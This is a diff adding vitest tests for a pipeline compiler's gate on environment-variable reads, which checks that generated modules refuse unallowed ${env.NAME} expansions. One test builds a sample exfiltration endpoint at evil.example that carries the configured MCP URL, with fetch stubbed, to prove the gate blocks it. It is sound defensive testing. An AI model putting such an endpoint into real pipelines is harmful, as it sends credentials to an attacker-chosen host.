@@ -1,8 +1,13 @@
+import { existsSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { pathToFileURL } from 'node:url';
 import { afterEach, beforeEach, describe, it, expect, vi } from 'vitest';
 import {
   compilePipelineSource,
   compilePipelineSourceToNode,
   compilePipelineSourceToPython,
+  summarizePipelineIo,
 } from '../PipelineNodeCompiler';
 import { compilePipelineSourceToNode as compileWithParserTarget } from '../../parser/PipelineCompiler';
 
@@ -313,5 +318,230 @@ describe('PipelineNodeCompiler — MCP servers a pipeline file may choose', () =
       expect(compile(mcpPipeline(`http://${LOCAL}:7411`)).success, target).toBe(true);
       expect(compile(mcpPipeline(`http://${LOCAL}:7412`)).success, target).toBe(false);
     }
+  });
+});
+
+// Board task task_1791176003202_obsc: a pipeline may read an environment variable only
+// if the operator allows it at run time. The CLI emitter expands ${env.NAME} inside
+// endpoints, paths and URLs; the generated module now gates those reads.
+describe('PipelineNodeCompiler — environment-read gate', () => {
+  const D = '$';
+  function pipeline(fields: { endpoint?: string; path?: string; sinkEndpoint?: string }): string {
+    const source = fields.endpoint
+      ? `source Feed { type: "rest" endpoint: "${fields.endpoint}" }`
+      : fields.path
+        ? `source Feed { type: "filesystem" path: "${fields.path}" }`
+        : `source Feed { type: "list" items: [{ id: 1 }] }`;
+    const sink = fields.sinkEndpoint
+      ? `sink Out { type: "webhook" endpoint: "${fields.sinkEndpoint}" }`
+      : `sink Out { type: "stdout" }`;
+    return `pipeline "EnvGate" { ${source} ${sink} }`;
+  }
+
+  it('summarizePipelineIo lists the env reads and static hosts', () => {
+    const io = summarizePipelineIo(
+      pipeline({
+        endpoint: `https://api.test/${D}{env.API_URL}/items`,
+        sinkEndpoint: `https://hook.test/${D}{env.WEBHOOK_TOKEN}`,
+      })
+    );
+    expect(io.success).toBe(true);
+    expect(io.envReads).toEqual(['API_URL', 'WEBHOOK_TOKEN']);
+    expect(io.hosts).toEqual(['https://api.test', 'https://hook.test']);
+    expect(io.dynamicHost).toBe(false);
+  });
+
+  it('flags a host that comes from the environment', () => {
+    const io = summarizePipelineIo(pipeline({ endpoint: `${D}{env.BASE_URL}/items` }));
+    expect(io.envReads).toEqual(['BASE_URL']);
+    expect(io.hosts).toEqual([]);
+    expect(io.dynamicHost).toBe(true);
+  });
+
+  // Every field the generated module hands to resolveTemplate() must be scanned, or an env
+  // read in it would slip past the operator's list. One row per field, so removing a field
+  // from the scan turns exactly its row red.
+  const LIST = 'source Feed { type: "list" items: [{ id: 1 }] }';
+  const STDOUT = 'sink Out { type: "stdout" }';
+  const READ = `${D}{env.SECRET_A}`;
+  it.each([
+    [
+      'a rest source endpoint',
+      `source Feed { type: "rest" endpoint: "https://api.test/${READ}" } ${STDOUT}`,
+    ],
+    [
+      'a stream source endpoint',
+      `source Feed { type: "stream" endpoint: "https://api.test/${READ}" } ${STDOUT}`,
+    ],
+    [
+      'a webhook source endpoint',
+      `source Feed { type: "webhook" endpoint: "https://api.test/${READ}" } ${STDOUT}`,
+    ],
+    [
+      'a filesystem source path',
+      `source Feed { type: "filesystem" path: "./${READ}/in.json" } ${STDOUT}`,
+    ],
+    [
+      'an http transform url',
+      `${LIST} transform Fetch { type: "http" url: "https://api.test/${READ}" } ${STDOUT}`,
+    ],
+    [
+      'a rest sink endpoint',
+      `${LIST} sink Out { type: "rest" endpoint: "https://api.test/${READ}" }`,
+    ],
+    [
+      'a webhook sink endpoint',
+      `${LIST} sink Out { type: "webhook" endpoint: "https://api.test/${READ}" }`,
+    ],
+    [
+      'a filesystem sink path',
+      `${LIST} sink Out { type: "filesystem" path: "./${READ}/out.json" }`,
+    ],
+  ])('scans %s for env reads', (_field, stages) => {
+    const source = `pipeline "ScanField" { ${stages} }`;
+    expect(summarizePipelineIo(source).envReads).toEqual(['SECRET_A']);
+    const compiled = compilePipelineSourceToNode(source);
+    expect(compiled.success).toBe(true);
+    expect(compiled.code).toContain('const PIPELINE_ENV_READS = ["SECRET_A"]');
+  });
+
+  it('embeds the env reads, the guard and the announcement in the generated module', () => {
+    const code = compilePipelineSourceToNode(
+      pipeline({ endpoint: `https://api.test/${D}{env.API_URL}/x` })
+    ).code!;
+    expect(code).toContain('const PIPELINE_ENV_READS = ["API_URL"]');
+    expect(code).toContain('function assertPipelineEnvAllowed()');
+    expect(code).toContain('announcePipelineIo();');
+    expect(code).toContain('assertPipelineEnvAllowed();');
+    // The header documents the reads for a reviewer who never runs it.
+    expect(code).toContain('Reads environment variables: API_URL');
+  });
+
+  describe('run-time gate (generated module imported in-process)', () => {
+    let dir: string;
+    const fetched: string[] = [];
+
+    beforeEach(() => {
+      dir = mkdtempSync(join(tmpdir(), 'holoscript-envgate-'));
+      fetched.length = 0;
+      vi.stubGlobal('fetch', async (url: unknown) => {
+        fetched.push(String(url));
+        return { ok: true, status: 200, statusText: 'OK', json: async () => [] };
+      });
+      vi.stubEnv('API_URL', 'configured');
+      vi.stubEnv('HOLOSCRIPT_PIPELINE_ALLOW_ENV', '');
+    });
+    afterEach(() => {
+      vi.unstubAllGlobals();
+      vi.unstubAllEnvs();
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    async function loadModule(code: string) {
+      const p = join(dir, `m-${Math.random().toString(36).slice(2)}.mjs`);
+      writeFileSync(p, code);
+      return import(pathToFileURL(p).href);
+    }
+
+    it('refuses an unallowed env read before any request', async () => {
+      const code = compilePipelineSourceToNode(
+        pipeline({ endpoint: `https://api.test/${D}{env.API_URL}/x` })
+      ).code!;
+      const mod = await loadModule(code);
+      await expect(mod.runPipeline()).rejects.toThrow(/API_URL.*--allow-env API_URL/s);
+      expect(fetched).toHaveLength(0); // refused before the source fetch
+    });
+
+    it('runs once the operator allows the variable', async () => {
+      vi.stubEnv('HOLOSCRIPT_PIPELINE_ALLOW_ENV', 'API_URL');
+      const code = compilePipelineSourceToNode(
+        pipeline({ endpoint: `https://api.test/${D}{env.API_URL}/x` })
+      ).code!;
+      const mod = await loadModule(code);
+      await expect(mod.runPipeline()).resolves.toBeDefined();
+      expect(fetched).toEqual(['https://api.test/configured/x']);
+    });
+
+    it('gives HOLOSCRIPT_MCP_URL no free pass in an endpoint: it needs the flag like any other variable', async () => {
+      // The configured MCP URL can carry a credential or a tunnel token. If any endpoint could
+      // read it without a flag, a file could send it to a host the file chose.
+      vi.stubEnv('HOLOSCRIPT_MCP_URL', 'https://mcp.test');
+      const exfil = `https://evil.example/?u=${D}{env.HOLOSCRIPT_MCP_URL}`;
+      const mod = await loadModule(
+        compilePipelineSourceToNode(pipeline({ endpoint: exfil })).code!
+      );
+      await expect(mod.runPipeline()).rejects.toThrow(
+        /"HOLOSCRIPT_MCP_URL".*--allow-env HOLOSCRIPT_MCP_URL/s
+      );
+      expect(fetched, 'the host the file chose must receive nothing').toEqual([]);
+
+      // Named by the operator, it is allowed like any other variable.
+      vi.stubEnv('HOLOSCRIPT_PIPELINE_ALLOW_ENV', 'HOLOSCRIPT_MCP_URL');
+      await expect(mod.runPipeline()).resolves.toBeDefined();
+      expect(fetched).toEqual(['https://evil.example/?u=https://mcp.test']);
+    });
+
+    it('needs no flag for HOLOSCRIPT_MCP_URL in an MCP stage server value', async () => {
+      // A server value is covered by the server policy (parser/PipelineServerPolicy.ts), which
+      // refuses every ${...} in it except the configured-server form. This emitter never reads
+      // a server value from the environment, so it asks the operator for nothing.
+      vi.stubEnv('HOLOSCRIPT_MCP_URL', 'https://mcp.test');
+      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+      try {
+        const source = `pipeline "McpServerValue" {
+          source Feed { type: "list" items: [{ id: 1 }] }
+          sink Out { type: "mcp" server: "${D}{env.HOLOSCRIPT_MCP_URL}" tool: "knowledge_write" }
+        }`;
+        expect(summarizePipelineIo(source).envReads).toEqual([]);
+        const compiled = compilePipelineSourceToNode(source);
+        expect(compiled.errors).toBeUndefined();
+        const mod = await loadModule(compiled.code!);
+        await expect(mod.runPipeline()).resolves.toBeDefined();
+        expect(fetched).toEqual([]);
+      } finally {
+        warn.mockRestore();
+      }
+    });
+
+    it('refuses an unallowed env read in a sink filesystem path before anything is written', async () => {
+      const sunk = join(dir, 'sunk');
+      vi.stubEnv('SINK_DIR', sunk);
+      const source = `pipeline "SinkPath" {
+        source Feed { type: "list" items: [{ id: 1 }] }
+        sink Out { type: "filesystem" path: "${D}{env.SINK_DIR}/out.jsonl" }
+      }`;
+      const mod = await loadModule(compilePipelineSourceToNode(source).code!);
+      await expect(mod.runPipeline()).rejects.toThrow(/"SINK_DIR".*--allow-env SINK_DIR/s);
+      expect(existsSync(sunk), 'nothing may be written').toBe(false);
+
+      vi.stubEnv('HOLOSCRIPT_PIPELINE_ALLOW_ENV', 'SINK_DIR');
+      await expect(mod.runPipeline()).resolves.toBeDefined();
+      expect(existsSync(join(sunk, 'out.jsonl'))).toBe(true);
+    });
+
+    it('allows exactly the variables the operator names, not even the keys', async () => {
+      for (const name of ['HOLOSCRIPT_API_KEY', 'HOLOSCRIPT_MCP_URL', 'API_URL']) {
+        vi.stubEnv(name, 'value-not-real');
+        const mod = await loadModule(
+          compilePipelineSourceToNode(pipeline({ endpoint: `https://api.test/${D}{env.${name}}` }))
+            .code!
+        );
+        await expect(mod.runPipeline(), name).rejects.toThrow(`--allow-env ${name}`);
+      }
+      expect(fetched, 'nothing may be requested without a flag').toEqual([]);
+
+      // A list that names one variable allows that one and nothing else.
+      vi.stubEnv('HOLOSCRIPT_PIPELINE_ALLOW_ENV', 'API_URL');
+      const mod = await loadModule(
+        compilePipelineSourceToNode(
+          pipeline({ endpoint: `https://api.test/${D}{env.API_URL}/${D}{env.HOLOSCRIPT_API_KEY}` })
+        ).code!
+      );
+      const error = await mod.runPipeline().catch((e: Error) => e);
+      expect(error).toBeInstanceOf(Error);
+      expect((error as Error).message).toContain('"HOLOSCRIPT_API_KEY"');
+      expect((error as Error).message).not.toContain('"API_URL"');
+      expect(fetched).toEqual([]);
+    });
   });
 });
